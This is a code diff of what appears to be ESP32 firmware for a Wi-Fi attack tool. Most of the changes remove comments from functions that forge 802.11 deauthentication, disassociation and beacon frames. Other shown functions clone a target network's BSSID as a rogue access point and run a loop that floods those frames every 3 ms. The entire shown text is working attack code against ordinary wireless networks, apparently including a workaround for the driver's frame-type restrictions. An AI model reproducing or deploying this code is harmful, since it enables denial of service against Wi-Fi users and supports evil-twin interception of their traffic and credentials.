@@ -26,7 +26,7 @@ static unsigned long cloneStartTime = 0;
 static uint8_t cloneHealthCheckFailures = 0;
 
 // ============================================================
-// RAW FRAME DEAUTH (via esp_wifi_80211_tx + WSL bypass)
+// RAW FRAME DEAUTH
 // ============================================================
 static uint16_t deauthSeqNum = 0;
 
@@ -61,11 +61,11 @@ static void sendDeauthFrame(const uint8_t* bssid, const uint8_t* clientMac) {
     deauthSeqNum++;
     if (deauthSeqNum > 4095) deauthSeqNum = 0;
 
-    // Reason Code: 0x0007 = Class 3 frame received from nonassociated STA
+    // Reason Code: 0x0007
     frame[24] = 0x07;
     frame[25] = 0x00;
 
-    // WIFI_IF_STA em modo AP_STA + auto_seq=true (evita warning)
+    // auto_seq=true evita warning do driver
     esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, frame, 26, true);
     if (err == ESP_OK) {
         deauthPacketCount++;
@@ -96,7 +96,7 @@ static void sendDisassocFrame(const uint8_t* bssid, const uint8_t* clientMac) {
     deauthSeqNum++;
     if (deauthSeqNum > 4095) deauthSeqNum = 0;
 
-    frame[24] = 0x08; // Reason: STA leaving BSS
+    frame[24] = 0x08;
     frame[25] = 0x00;
 
     esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, frame, 26, true);
@@ -113,38 +113,25 @@ static void sendBeaconFrame(const uint8_t* bssid, const char* ssid) {
     uint8_t beacon[128];
     memset(beacon, 0, 128);
 
-    // Frame Control: Beacon (0x0080)
     beacon[0] = 0x80;
     beacon[1] = 0x00;
-
-    // Duration
     beacon[2] = 0x00;
     beacon[3] = 0x00;
 
-    // DA = Broadcast
     memset(&beacon[4], 0xFF, 6);
-
-    // SA = BSSID
     memcpy(&beacon[10], bssid, 6);
-
-    // BSSID
     memcpy(&beacon[16], bssid, 6);
 
-    // Sequence
     beacon[22] = 0x00;
     beacon[23] = 0x00;
 
-    // Timestamp (8 bytes) - zeros
-    // Beacon interval (2 bytes) = 0x0064 (100 TU)
     beacon[32] = 0x64;
     beacon[33] = 0x00;
 
-    // Capability info (2 bytes) = ESS
     beacon[34] = 0x01;
     beacon[35] = 0x00;
 
-    // SSID IE
-    beacon[36] = 0x00; // Element ID: SSID
+    beacon[36] = 0x00;
     uint8_t ssidLen = strlen(ssid);
     if (ssidLen > 32) ssidLen = 32;
     beacon[37] = ssidLen;
@@ -152,7 +139,6 @@ static void sendBeaconFrame(const uint8_t* bssid, const char* ssid) {
 
     uint8_t frameLen = 38 + ssidLen;
 
-    // Beacons sao permitidos pela interface AP
     esp_wifi_80211_tx(WIFI_IF_AP, beacon, frameLen, true);
 }
 
@@ -229,7 +215,7 @@ static void startBssidClone(uint8_t networkIndex) {
     WiFi.softAPdisconnect(true);
     delay(400);
 
-    // MODO AP_STA (ambas as interfaces existem: STA=0, AP=1)
+    // MODO AP_STA - ambas interfaces existem
     WiFi.mode(WIFI_AP_STA);
     delay(300);
 
@@ -298,7 +284,7 @@ static void stopBssidClone() {
 }
 
 // ============================================================
-// DEAUTH - COMBINADO: Raw frames + Rogue AP
+// DEAUTH - Raw frames + Rogue AP
 // ============================================================
 void startDeauth(uint8_t networkIndex) {
     if (networkIndex >= networkCount) {
@@ -334,9 +320,9 @@ void stopDeauth() {
 bool deauthLoop() {
     if (!deauthActive) return false;
 
-    // === ENVIO CONTINUO DE DEAUTH/DISASSOC/BEACON ===
+    // === ENVIO CONTINUO ===
     static unsigned long lastDeauthTx = 0;
-    if (millis() - lastDeauthTx >= 3) { // A cada 3ms
+    if (millis() - lastDeauthTx >= 3) {
         lastDeauthTx = millis();
 
         static uint8_t txRound = 0;
